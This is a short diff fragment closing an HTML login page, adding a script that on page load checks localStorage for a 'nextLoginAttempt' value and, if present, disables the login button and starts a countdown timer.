+        document.addEventListener('DOMContentLoaded', () => {
+            const nextAttempt = localStorage.getItem('nextLoginAttempt');
+            if (nextAttempt) {
+                document.getElementById('loginButton').disabled = true;
+                updateLoginTimer();
+            }
+        });
+    </script>
+</body>
+</html>
